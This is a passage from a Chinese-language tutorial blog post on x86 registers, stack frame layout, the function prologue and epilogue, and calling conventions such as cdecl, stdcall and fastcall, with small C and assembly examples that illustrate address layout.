(lower32-bit)中；又如函数返回值通常保存在%eax中，等等。为避免兼容性问题，ABI规范对这组通用寄存器的具体作用加以定义(如图中所示)。</p><p>对于寄存器%eax、%ebx、%ecx和%edx，各自可作为两个独立的16位寄存器使用，而低16位寄存器还可继续分为两个独立的8位寄存器使用。编译器会根据操作数大小选择合适的寄存器来生成汇编代码。在汇编语言层面，这组通用寄存器以%e(AT&amp;T语法)或直接以e(Intel语法)开头来引用，例如mov $5, %eax或mov eax, 5表示将立即数5赋值给寄存器%eax。</p><p>在x86处理器中，EIP(Instruction Pointer)是<strong>指令寄存器</strong>，指向处理器下条等待执行的指令地址(<strong>代码段内的偏移量</strong>)，每次执行完相应汇编指令EIP值就会增加。ESP(Stack Pointer)是堆栈指针寄存器，存放执行函数对应栈帧的栈顶地址(也是系统栈的顶部)，且始终指向栈顶；EBP(Base Pointer)是栈帧基址指针寄存器，存放执行函数<strong>对应栈帧的栈底地址</strong>，用于C运行库访问栈中的局部变量和参数。</p><p>注意，EIP是个特殊寄存器，不能像访问通用寄存器那样访问它，即找不到可用来寻址EIP并对其进行读写的操作码(OpCode)。EIP可被jmp、call和ret等指令隐含地改变(事实上它一直都在改变)。</p><p><strong>不同架构的CPU，寄存器名称被添加不同前缀以指示寄存器的大小。例如x86架构用字母“e(extended)”作名称前缀，指示寄存器大小为32位；x86_64架构用字母“r”作名称前缀，指示各寄存器大小为64位</strong>。</p><p>编译器在将C程序编译成汇编程序时，应遵循ABI所规定的寄存器功能定义。同样地，编写汇编程序时也应遵循，否则所编写的汇编程序可能无法与C程序协同工作。</p><p><strong>栈帧指针寄存器</strong></p><p>为了访问函数局部变量，必须能定位每个变量。局部变量相对于堆栈指针ESP的位置在进入函数时就已确定，理论上变量可用ESP加偏移量来引用，但ESP会在函数执行期随变量的压栈和出栈而变动。尽管某些情况下编译器能跟踪栈中的变量操作以修正偏移量，但要引入可观的管理开销。而且在有些机器上(如Intel处理器)，用ESP加偏移量来访问一个变量需要多条指令才能实现。</p><p>因此，许多编译器使用帧指针寄存器FP(Frame Pointer)<strong>记录栈帧基地址</strong>。局部变量和函数参数都可通过帧指针引用，因为它们到FP的距离不会受到压栈和出栈操作的影响。有些资料将帧指针称作<strong>局部基指针</strong>(LB-local base pointer)。</p><p>在Intel CPU中，寄存器BP(EBP)用作帧指针。在Motorola CPU中，除A7(堆栈指针SP)外的任何地址寄存器都可用作FP。当堆栈向下(低地址)增长时，以FP地址为基准，<strong>函数参数的偏移量是正值，而局部变量的偏移量是负值</strong>。</p><p><strong>2.寄存器使用约定</strong></p><p>程序寄存器组是唯一能被所有函数共享的资源。虽然某一时刻只有一个函数在执行，但需保证当某个函数调用其他函数时，被调函数不会修改或覆盖主调函数稍后会使用到的寄存器值。因此，IA32采用一套统一的寄存器使用约定，所有函数(包括库函数)调用都必须遵守该约定。</p><p>根据惯例，寄存器%eax、%edx和%ecx为主调函数保存寄存器(caller-saved registers)，当函数调用时，若主调函数希望保持这些寄存器的值，则必须在调用前显式地将其保存在栈中；被调函数可以覆盖这些寄存器，而不会破坏主调函数所需的数据。寄存器%ebx、%esi和%edi为被调函数保存寄存器(callee-saved registers)，即被调函数在覆盖这些寄存器的值时，必须先将寄存器原值压入栈中保存起来，并在函数返回前从栈中恢复其原值，因为主调函数可能也在使用这些寄存器。此外，被调函数必须保持寄存器%ebp和%esp，并在函数返回后将其恢复到调用前的值，亦即必须恢复主调函数的栈帧。</p><p>当然，这些工作都由编译器在幕后进行。不过在编写汇编程序时应注意遵守上述惯例。</p><p><strong>3 栈帧结构</strong></p><p>函数调用经常是嵌套的，在同一时刻，堆栈中会有多个函数的信息。每个未完成运行的函数占用一个独立的连续区域，称作栈帧(Stack Frame)。<strong>栈帧是堆栈的逻辑片段</strong>，当调用函数时逻辑栈帧被压入堆栈, 当函数返回时逻辑栈帧被从堆栈中弹出。栈帧存放着函数参数，局部变量及恢复前一栈帧所需要的数据等。</p><p>编译器利用栈帧，使得函数参数和函数中局部变量的分配与释放对程序员透明。编译器将控制权移交函数本身之前，插入特定代码将函数参数压入栈帧中，并分配足够的内存空间用于存放函数中的局部变量。使用栈帧的一个好处是使得递归变为可能，因为对函数的每次递归调用，都会分配给该函数一个新的栈帧，这样就巧妙地隔离当前调用与上次调用。</p><p>栈帧的边界由栈帧基地址指针EBP和堆栈指针ESP界定(指针存放在相应寄存器中)。EBP指向当前栈帧底部(高地址)，在当前栈帧内位置固定；ESP指向当前栈帧顶部(低地址)，当程序执行时ESP会随着数据的入栈和出栈而移动。因此函数中对大部分数据的访问都基于EBP进行。</p><p>为更具描述性，以下称EBP为帧基指针， ESP为栈顶指针，并在引用汇编代码时分别记为%ebp和%esp。</p><p>函数调用栈的典型内存布局如下图所示：</p><p><img src="/../00000000/image-20250209110534527.png" alt="image-20250209110534527"></p><p><strong>我一般这样理解栈帧：</strong></p><table><thead><tr><th align="center">Argument_3</th></tr></thead><tbody><tr><td align="center">Argument_2</td></tr><tr><td align="center">Argument_1</td></tr><tr><td align="center">ret_addr</td></tr><tr><td align="center">ebp—-&gt;old_ebp</td></tr><tr><td align="center">local_value_1</td></tr><tr><td align="center">local_value_2</td></tr><tr><td align="center">local_value_3</td></tr><tr><td align="center">esp—-&gt;local_value_4</td></tr></tbody></table><p>暂时没什么因为这个发生的错误</p><p>图中给出主调函数(caller)和被调函数(callee)的栈帧布局，”m(%ebp)”表示以EBP为基地址、偏移量为m字节的内存空间(中的内容)。</p><p>该图基于两个假设：</p><p>第一，函数返回值不是结构体或联合体，否则第一个参数将位于”12(%ebp)” 处；</p><p>第二，每个参数都是4字节大小(栈的粒度为4字节)。在本文后续章节将就参数的传递和大小问题做进一步的探讨。</p><p>此外，函数可以没有参数和局部变量，故图中“Argument(参数)”和“Local Variable(局部变量)”不是函数栈帧结构的必需部分。</p><p>从图中可以看出，函数调用时入栈顺序为</p><p><img src="/../00000000/image-20250209112848213.png" alt="image-20250209112848213"></p><p>其中，主调函数将参数按照调用约定依次入栈(图中为<strong>从右到左</strong>)，然后将指令指针EIP入栈以保存主调函数的返回地址(<strong>下一条待执行指令的地址</strong>)。进入被调函数时，被调函数将主调函数的帧基指针EBP入栈，并将主调函数的栈顶指针ESP值赋给被调函数的EBP(作为被调函数的栈底)，接着改变ESP值来为函数局部变量预留空间。此时被调函数帧基指针指向被调函数的栈底。以该地址为基准，向上(栈底方向)可获取主调函数的返回地址、参数值，向下(栈顶方向)能获取被调函数的局部变量值，而该地址处又存放着上一层主调函数的帧基指针值。本级调用结束后，将EBP指针值赋给ESP，使ESP再次指向被调函数栈底以释放局部变量；再将已压栈的主调函数帧基指针弹出到EBP，并弹出返回地址到EIP。ESP继续上移越过参数，最终回到函数调用前的状态，即恢复原来主调函数的栈帧。如此递归便形成函数调用栈。</p><p>EBP指针在当前函数运行过程中(未调用其他函数时)保持不变。在函数调用前，ESP指针指向栈顶地址，也是栈底地址。在函数完成现场保护之类的初始化工作后，ESP会始终指向当前函数栈帧的栈顶，此时，若当前函数又调用另一个函数，则会将此时的EBP视为旧EBP压栈，而与新调用函数有关的内容会从当前ESP所指向位置开始压栈。</p><p>若需在函数中保存被调函数保存寄存器(如ESI、EDI)，则编译器在保存EBP值时进行保存，或延迟保存直到局部变量空间被分配。在栈帧中并未为被调函数保存寄存器的空间指定标准的存储位置。包含寄存器和临时变量的函数调用栈布局可能如下图所示：</p><p><img src="/../00000000/image-20250209113332971.png" alt="image-20250209113332971"></p><p>在多线程(任务)环境，栈顶指针指向的存储器区域就是当前使用的堆栈。切换线程的一个重要工作，就是将栈顶指针设为当前线程的堆栈栈顶地址。</p><p>以下代码用于函数栈布局示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span> <span class="hljs-comment">//StackFrame.c</span><br><span class="hljs-number">2</span> <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-number">3</span> <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-number">4</span> <br><span class="hljs-number">5</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Strt</span>&#123;</span><br><span class="hljs-number">6</span>     <span class="hljs-type">int</span> member1;<br><span class="hljs-number">7</span>     <span class="hljs-type">int</span> member2;<br><span class="hljs-number">8</span>     <span class="hljs-type">int</span> member3;<br><span class="hljs-number">9</span> &#125;;<br><span class="hljs-number">10</span> <br><span class="hljs-number">11</span> <span class="hljs-meta">#<span class="hljs-keyword">define</span> PRINT_ADDR(x)     printf(<span class="hljs-string">&quot;&amp;&quot;</span>#x<span class="hljs-string">&quot; = %p\n&quot;</span>, &amp;x)</span><br><span class="hljs-number">12</span> <span class="hljs-type">int</span> <span class="hljs-title function_">StackFrameContent</span><span class="hljs-params">(<span class="hljs-type">int</span> para1, <span class="hljs-type">int</span> para2, <span class="hljs-type">int</span> para3)</span>&#123;<br><span class="hljs-number">13</span>     <span class="hljs-type">int</span> locVar1 = <span class="hljs-number">1</span>;<br><span class="hljs-number">14</span>     <span class="hljs-type">int</span> locVar2 = <span class="hljs-number">2</span>;<br><span class="hljs-number">15</span>     <span class="hljs-type">int</span> locVar3 = <span class="hljs-number">3</span>;<br><span class="hljs-number">16</span>     <span class="hljs-type">int</span> arr[] = &#123;<span class="hljs-number">0x11</span>,<span class="hljs-number">0x22</span>,<span class="hljs-number">0x33</span>&#125;;<br><span class="hljs-number">17</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Strt</span> <span class="hljs-title">tStrt</span> =</span> &#123;<span class="hljs-number">0</span>&#125;;<br><span class="hljs-number">18</span>     PRINT_ADDR(para1); <span class="hljs-comment">//若para1为char或short型，则打印para1所对应的栈上整型临时变量地址！</span><br><span class="hljs-number">19</span>     PRINT_ADDR(para2);<br><span class="hljs-number">20</span>     PRINT_ADDR(para3);<br><span class="hljs-number">21</span>     PRINT_ADDR(locVar1);<br><span class="hljs-number">22</span>     PRINT_ADDR(locVar2);<br><span class="hljs-number">23</span>     PRINT_ADDR(locVar3);<br><span class="hljs-number">24</span>     PRINT_ADDR(arr);<br><span class="hljs-number">25</span>     PRINT_ADDR(arr[<span class="hljs-number">0</span>]);<br><span class="hljs-number">26</span>     PRINT_ADDR(arr[<span class="hljs-number">1</span>]);<br><span class="hljs-number">27</span>     PRINT_ADDR(arr[<span class="hljs-number">2</span>]);<br><span class="hljs-number">28</span>     PRINT_ADDR(tStrt);<br><span class="hljs-number">29</span>     PRINT_ADDR(tStrt.member1);<br><span class="hljs-number">30</span>     PRINT_ADDR(tStrt.member2);<br><span class="hljs-number">31</span>     PRINT_ADDR(tStrt.member3);<br><span class="hljs-number">32</span>     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-number">33</span> &#125;<br><span class="hljs-number">34</span> <br><span class="hljs-number">35</span> <span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br><span class="hljs-number">36</span>     <span class="hljs-type">int</span> locMain1 = <span class="hljs-number">1</span>, locMain2 = <span class="hljs-number">2</span>, locMain3 = <span class="hljs-number">3</span>;<br><span class="hljs-number">37</span>     PRINT_ADDR(locMain1);<br><span class="hljs-number">38</span>     PRINT_ADDR(locMain2);<br><span class="hljs-number">39</span>     PRINT_ADDR(locMain3);<br><span class="hljs-number">40</span>     StackFrameContent(locMain1, locMain2, locMain3);<br><span class="hljs-number">41</span>     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[locMain1,2,3] = [%d, %d, %d]\n&quot;</span>, locMain1, locMain2, locMain3);<br><span class="hljs-number">42</span>     <span class="hljs-built_in">memset</span>(&amp;locMain2, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br><span class="hljs-number">43</span>     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[locMain1,2,3] = [%d, %d, %d]\n&quot;</span>, locMain1, locMain2, locMain3);<br><span class="hljs-number">44</span>     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-number">45</span> &#125;<br>StackFrame<br></code></pre></td></tr></table></figure><p>编译</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc -o Frame StackFrame.c<br></code></pre></td></tr></table></figure><p>打印结果：</p><p><img src="/../00000000/image-20250209114235950.png" alt="image-20250209114235950"></p><p>栈帧布局图：</p><p><img src="/../00000000/image-20250209114613247.png" alt="image-20250209114613247"></p><p>内存地址从栈底到栈顶递减，压栈就是把ESP指针逐渐往地低址移动的过程。而结构体tStrt中的成员变量memberX地址&#x3D; tStrt首地址 + (memberX偏移量)，即越靠近tStrt首地址的成员变量其内存地址越小。因此，<strong>结构体成员变量的入栈顺序与其在结构体中声明的顺序相反</strong>。</p><p>函数调用以值传递时，传入的实参(locMain1<del>3)与被调函数内操作的形参(para1</del>3)两者存储地址不同，因此被调函数无法直接修改主调函数实参值(对形参的操作相当于修改实参的副本)。为达到修改目的，需要向被调函数传递实参变量的指针(即变量的地址)。</p><p>此外，”[locMain1,2,3] &#x3D; [0, 0, 3]”是因为对四字节参数locMain2调用memset函数时，会从低地址向高地址连续清零8个字节，从而误将位于高地址locMain1清零。</p><p>注意，局部变量的布局依赖于编译器实现等因素。因此，当StackFrameContent函数中删除打印语句时，变量locVar3、locVar2和locVar1可能按照从高到低的顺序依次存储！而且，局部变量并不总在栈中，有时出于性能(速度)考虑会存放在寄存器中。数组&#x2F;结构体型的局部变量通常分配在栈内存中。</p><p><strong>函数局部变量布局方式</strong></p><p>与函数调用约定规定参数如何传入不同，局部变量以何种方式布局并未规定。编译器计算函数局部变量所需要的空间总数，并确定这些变量存储在寄存器上还是分配在程序栈上(甚至被优化掉)——某些处理器并没有堆栈。局部变量的空间分配与主调函数和被调函数无关，仅仅从函数源代码上无法确定该函数的局部变量分布情况。</p><p>基于不同的编译器版本(gcc3.4中局部变量按照定义顺序依次入栈，gcc4及以上版本则不定)、优化级别、目标处理器架构、栈安全性等，相邻定义的两个变量在内存位置上可能相邻，也可能不相邻，前后关系也不固定。若要确保两个对象在内存上相邻且前后关系固定，可使用结构体或数组定义。</p><p><strong>4 堆栈操作</strong></p><p>函数调用时的具体步骤如下：</p><ol><li><p>主调函数将被调函数所要求的参数，根据相应的函数调用约定，保存在运行时栈中。该操作会改变程序的栈指针。</p><p>注：<strong>x86平台将参数压入调用栈中。而x86_64平台具有16个通用64位寄存器，故调用函数时前6个参数通常由寄存器传递，其余参数才通过栈传递。</strong></p></li><li><p>主调函数将控制权移交给被调函数(使用call指令)。函数的返回地址(<strong>待执行的下条指令地址</strong>)保存在程序栈中(压栈操作隐含在call指令中)。</p></li><li><p>若有必要，被调函数会设置帧基指针，并保存被调函数希望保持不变的寄存器值。</p></li><li><p>被调函数通过修改栈顶指针的值，为自己的局部变量在运行时栈中分配内存空间，并从帧基指针的位置处<strong>向低地址方向</strong>存放被调函数的局部变量和临时变量。</p></li><li><p>被调函数执行自己任务，此时可能需要访问由主调函数传入的参数。<strong>若被调函数返回一个值，该值通常保存在一个指定寄存器中(如EAX)</strong>。</p></li><li><p>一旦被调函数完成操作，为该函数局部变量分配的栈空间将被释放。这通常是步骤4的逆向执行。</p></li><li><p>恢复步骤3中保存的寄存器值，包含主调函数的帧基指针寄存器。</p></li><li><p>被调函数将控制权交还主调函数(使用ret指令)。根据使用的函数调用约定，该操作也可能从程序栈上清除先前传入的参数。</p></li><li><p>主调函数再次获得控制权后，可能需要将先前的参数从栈上清除。在这种情况下，对栈的修改需要将帧基指针值恢复到步骤1之前的值。</p><p>步骤3与步骤4在函数调用之初常一同出现，统称为函数序(prologue)；步骤6到步骤8在函数调用的最后常一同出现，统称为函数跋(epilogue)。函数序和函数跋是编译器自动添加的开始和结束汇编代码，其实现与CPU架构和编译器相关。除步骤5代表函数实体外，其它所有操作组成函数调用。</p></li></ol><p>以下介绍函数调用过程中的主要指令。</p><p><strong>压栈</strong>(push)：栈顶指针<strong>ESP减小4个字节</strong>；以字节为单位将寄存器数据(四字节，不足补零)压入堆栈，从高到低按字节依次将数据存入ESP-1、ESP-2、ESP-3、ESP-4指向的地址单元。</p><p><strong>出栈</strong>(pop)：栈顶指针ESP指向的栈中数据被取回到寄存器；栈顶指针<strong>ESP增加4个字节</strong>。</p><p><img src="/../00000000/image-20250209120547275.png" alt="image-20250209120547275"></p><p>可见，压栈操作将寄存器内容存入栈内存中(寄存器原内容不变)，栈顶地址减小；出栈操作从栈内存中取回寄存器内容(栈内已存数据不会自动清零)，栈顶地址增大。栈顶指针ESP总是指向栈中下一个可用数据。</p><p><strong>调用</strong>(call)：将当前的指令指针EIP(该指针指向紧接在call指令后的下条指令)压入堆栈，以备返回时能恢复执行下条指令；然后设置EIP指向被调函数代码开始处，以跳转到被调函数的入口地址执行。</p><p><strong>离开</strong>(leave)： 恢复主调函数的栈帧以准备返回。等价于指令序列movl %ebp, %esp(恢复原ESP值，指向被调函数栈帧开始处)和popl %ebp(恢复原ebp的值，即主调函数帧基指针)。</p><p><strong>返回</strong>(ret)：与call指令配合，用于从函数或过程返回。从栈顶弹出返回地址(之前call指令保存的下条指令地址)到EIP寄存器中，程序转到该地址处继续执行(此时ESP指向进入函数时的第一个参数)。若带立即数，ESP再加立即数(丢弃一些在执行call前入栈的参数)。使用该指令前，应使当前栈顶指针所指向位置的内容正好是先前call指令保存的返回地址。</p><p>基于以上指令，使用C调用约定的被调函数典型的函数序和函数跋实现如下：</p><p><img src="/../00000000/image-20250209201350011.png" alt="image-20250209201350011"></p><p><strong>若主调函数和调函数均未使用局部变量寄存器EDI、ESI和EBX，则编译器无须在函数序中对其压栈，以便提高程序的执行效率。</strong></p><p>参数压栈指令因编译器而异，如下两种压栈方式基本等效：</p><p><img src="/../00000000/image-20250209120723096.png" alt="image-20250209120723096"></p><p>两种压栈方式均遵循C调用约定，但方式二中主调函数在调用返回后并未显式清理堆栈空间。因为在被调函数序阶段，编译器在栈顶为函数参数预先分配内存空间(sub指令)。函数参数被复制到栈中(而非压入栈中)，并未修改栈顶指针，故调用返回时主调函数也无需修改栈顶指针。gcc3.4(或更高版本)编译器采用该技术将函数参数传递至栈上，相比栈顶指针随每次参数压栈而多次下移，一次性设置好栈顶指针更为高效。设想连续调用多个函数时，方式二仅需预先分配一次参数内存(大小足够容纳参数尺寸和最大的函数即可)，后续调用无需每次都恢复栈顶指针。注意，函数被调用时，两种方式均使栈顶指针指向函数最左边的参数。本文不再区分两种压栈方式，”压栈”或”入栈”所提之处均按相应汇编代码理解，若无汇编则指方式二。</p><p>某些情况下，编译器生成的函数调用进入&#x2F;退出指令序列并不按照以上方式进行。例如，若C函数声明为static(只在本编译单元内可见)且函数在编译单元内被直接调用，未被显示或隐式取地址(即没有任何函数指针指向该函数)，此时编译器确信该函数不会被其它编译单元调用，因此可随意修改其进&#x2F;出指令序列以达到优化目的。</p><p>尽管使用的寄存器名字和指令在不同处理器架构上有所不同，但创建栈帧的基本过程一致。</p><p>注意，栈帧是运行时概念，若程序不运行，就不存在栈和栈帧。但通过分析目标文件中建立函数栈帧的汇编代码(尤其是函数序和函数跋过程)，即使函数没有运行，也能了解函数的栈帧结构。通过分析可确定分配在函数栈帧上的局部变量空间准确值，函数中是否使用帧基指针，以及识别函数栈帧中对变量的所有内存引用。</p><p><strong>5.函数调用约定</strong></p><p>创建一个栈帧的最重要步骤是主调函数如何向栈中传递函数参数。主调函数必须精确存储这些参数，以便被调函数能够访问到它们。函数通过选择特定的调用约定，来表明其希望以特定方式接收参数。此外，当被调函数完成任务后，调用约定规定先前入栈的参数由主调函数还是被调函数负责清除，以保证程序的栈顶指针完整性。</p><p> 函数调用约定通常规定如下几方面内容：</p><ol><li><p>函数参数的传递顺序和方式</p><p>最常见的参数传递方式是通过堆栈传递。主调函数将参数压入栈中，被调函数以相对于帧基指针的正偏移量来访问栈中的参数。对于有多个参数的函数，调用约定需规定主调函数将参数压栈的顺序(从左至右还是从右至左)。某些调用约定允许使用寄存器传参以提高性能。</p></li><li><p>栈的维护方式</p><p>主调函数将参数压栈后调用被调函数体，返回时需将被压栈的参数全部弹出，以便将栈恢复到调用前的状态。该清栈过程可由主调函数负责完成，也可由被调函数负责完成。</p></li><li><p>名字修饰(Name-mangling)策略</p><p>又称函数名修饰(Decorated Name)规则。编译器在链接时为区分不同函数，对函数名作不同修饰。</p></li></ol><p>若函数之间的调用约定不匹配，可能会产生堆栈异常或链接错误等问题。因此，为了保证程序能正确执行，所有的函数调用均应遵守一致的调用约定。</p><p><strong>5.1常见函数调用约定</strong></p><p>下面分别介绍常见的几种函数调用约定。</p><p>   <strong>1. cdecl调用约定</strong></p><p>   又称C调用约定，是C&#x2F;C++编译器默认的函数调用约定。所有非C++成员函数和未使用 stdcall 或 fastcall 声明的函数都默认是cdecl方式。<strong>函数参数按照从右到左的顺序入栈</strong>，<strong>函数调用者负责清除栈中的参数</strong>，<strong>返回值在EAX中</strong>。由于每次函数调用都要产生清除(还原)堆栈的代码，故使用cdecl方式编译的程序比使用stdcall方式编译的程序大(后者仅需在被调函数内产生一份清栈代码)。但cdecl调用方式支持可变参数函数(即函数带有可变数目的参数，如printf)，且<strong>调用时即使实参和形参数目不符也不会导致堆栈错误</strong>。</p><p>对于C函数，cdecl方式的名字修饰约定是在函数名前添加一个下划线；对于C++函数，除非特别使用extern “C”，C++函数使用不同的名字修饰方式。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css">【扩展阅读】可变参数函数支持条件<br>若要支持可变参数的函数，则参数应自右向左进栈，并且由主调函数负责清除栈中的参数(参数出栈)。<br>首先，参数按照从右向左的顺序压栈，则参数列表最左边(第一个)的参数最接近栈顶位置。所有参数距离帧基指针的偏移量都是常数，而不必关心已入栈的参数数目。只要不定的参数的数目能根据第一个已明确的参数确定，就可使用不定参数。例如printf函数，第一个参数即格式化字符串可作为后继参数指示符。通过它们就可得到后续参数的类型和个数，进而知道所有参数的尺寸。当传递的参数过多时，以帧基指针为基准，获取适当数目的参数，其他忽略即可。若函数参数自左向右进栈，则第一个参数距离栈帧指针的偏移量与已入栈的参数数目有关，需要计算所有参数占用的空间后才能精确定位。当实际传入的参数数目与函数期望接受的参数数目不同时，偏移量计算会出错！<br>其次，调用函数将参数压栈，只有它才知道栈中的参数数目和尺寸，因此调用函数可安全地清栈。而被调函数永远也不能事先知道将要传入函数的参数信息，难以对栈顶指针进行调整。<br>C++为兼容C，仍然支持函数带有可变的参数。但在C++中更好的选择常常是函数多态。<br></code></pre></td></tr></table></figure><p> <strong>2. stdcall调用约定(微软命名)</strong></p><p>   Pascal程序缺省调用方式，WinAPI也多采用该调用约定。stdcall调用约定主调函数参数从右向左入栈，除指针或引用类型参数外所有参数采用传值方式传递，由被调函数负责清除栈中的参数，返回值在EAX中。stdcall调用约定仅适用于参数个数固定的函数，因为被调函数清栈时无法精确获知栈上有多少函数参数；而且如果调用时实参和形参数目不符会导致堆栈错误。对于C函数，stdcall名称修饰方式是在函数名字前添加下划线，在函数名字后添加@和函数参数的大小，如_functionname@number。</p><p>   <strong>3. fastcall调用约定</strong></p><p>   stdcall调用约定的变形，通常使用ECX和EDX寄存器传递前两个DWORD(四字节双字)类型或更少字节的函数参数，其余参数按照从右向左的顺序入栈，被调函数在返回前负责清除栈中的参数，返回值在 EAX 中。因为并不是所有的参数都有压栈操作，所以比stdcall和cdecl快些。编译器使用两个@修饰函数名字，后跟十进制数表示的函数参数列表大小(字节数)，如@function_name@number。需注意fastcall函数调用约定在不同编译器上可能有不同的实现，比如16位编译器和32位编译器。另外，在使用内嵌汇编代码时，还应注意不能和编译器使用的寄存器有冲突。</p><p>   <strong>4. thiscall调用约定</strong></p><p>   C++类中的非静态函数必须接收一个指向主调对象的类指针(this指针)，并可能较频繁的使用该指针。主调函数的对象地址必须由调用者提供，并在调用对象非静态成员函数时将对象指针以参数形式传递给被调函数。编译器默认使用thiscall调用约定以高效传递和存储C++类的非静态成员函数的this指针参数。</p><p>   thiscall调用约定函数参数按照从右向左的顺序入栈。若参数数目固定，则类实例的this指针通过ECX寄存器传递给被调函数，被调函数自身清理堆栈；若参数数目不定，则this指针在所有参数入栈后再入栈，主调函数清理堆栈。thiscall不是C++关键字，故不能使用thiscall声明函数，它只能由编译器使用。</p><p>   注意，该调用约定特点随编译器不同而不同，g++中thiscall与cdecl基本相同，只是隐式地将this指针当作非静态成员函数的第1个参数，主调函数在调用返回后负责清理栈上参数；而在VC中，this指针存放在%ecx寄存器中，参数从右至左压栈，非静态成员函数负责清理栈上参数。</p><p> <strong>5. naked call调用约定</strong></p><p>   对于使用naked call方式声明的函数，编译器不产生保存(prologue)和恢复(epilogue)寄存器的代码，且不能用return返回返回值(只能用内嵌汇编返回结果)，故称naked call。该调用约定用于一些特殊场合，如声明处于非C&#x2F;C++上下文中的函数，并由程序员自行编写初始化和清栈的内嵌汇编指令。注意，naked call并非类型修饰符，故该调用约定必须与__declspec同时使用，如VC下定义求和函数：</p><p>   代码示例如下(Windows采用Intel汇编语法，注释符为;)：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">1 __declspec(naked) int __stdcall function(int a, int b) &#123;<br>2     ;mov DestRegister, SrcImmediate(Intel) vs. movl $SrcImmediate, %DestRegister(AT&amp;T)<br>3     __asm mov eax, a<br>4     __asm add eax, b<br>5     __asm ret 8<br>6 &#125;<br></code></pre></td></tr></table></figure><p>注意，__declspec是微软关键字，其他系统上可能没有。</p><p> <strong>6. pascal调用约定</strong></p><p>   Pascal语言调用约定，参数按照从左至右的顺序入栈。Pascal语言只支持固定参数的函数，参数的类型和数量完全可知，故由被调函数自身清理堆栈。pascal调用约定输出的函数名称无任何修饰且全部大写。</p><p>   Win3.X(16位)时支持真正的pascal调用约定；而Win9.X(32位)以后pascal约定由stdcall约定代替(以C约定压栈以Pascal约定清栈)。</p><p>   上述调用约定的主要特点如下表所示：</p><p><img src="/../00000000/image-20250209211620931.png" alt="image-20250209211620931"></p><p>Windows下可直接在函数声明前添加关键字__stdcall、__cdecl或__fastcall等标识确定函数的调用方式，如int __stdcall func()。Linux下可借用函数attribute 机制，如int <strong>attribute</strong>((<strong>stdcall</strong>)) func()。</p><p>代码示例如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span> <span class="hljs-type">int</span> __attribute__((__cdecl__)) CalleeFunc(<span class="hljs-type">int</span> i, <span class="hljs-type">int</span> j, <span class="hljs-type">int</span> k)&#123;<br><span class="hljs-number">2</span> <span class="hljs-comment">// int __attribute__((__stdcall__)) CalleeFunc(int i, int j, int k)&#123;</span><br><span class="hljs-number">3</span> <span class="hljs-comment">//int __attribute__((__fastcall__)) CalleeFunc(int i, int j, int k)&#123;</span><br><span class="hljs-number">4</span>     <span class="hljs-keyword">return</span> i+j+k;<br><span class="hljs-number">5</span> &#125;<br><span class="hljs-number">6</span> <span class="hljs-type">void</span> <span class="hljs-title function_">CallerFunc</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br><span class="hljs-number">7</span>     CalleeFunc(<span class="hljs-number">0x11</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x33</span>);<br><span class="hljs-number">8</span> &#125;<br><span class="hljs-number">9</span> <span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br><span class="hljs-number">10</span>     CallerFunc();<br><span class="hljs-number">11</span>     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-number">12</span> &#125;<br><br></code></pre></td></tr></table></figure><p> 被调函数CalleeFunc分别声明为cdecl、stdcall和fastcall约定时，其汇编代码比较如下表所示：</p><p><img src="/../00000000/image-20250209211754260.png" 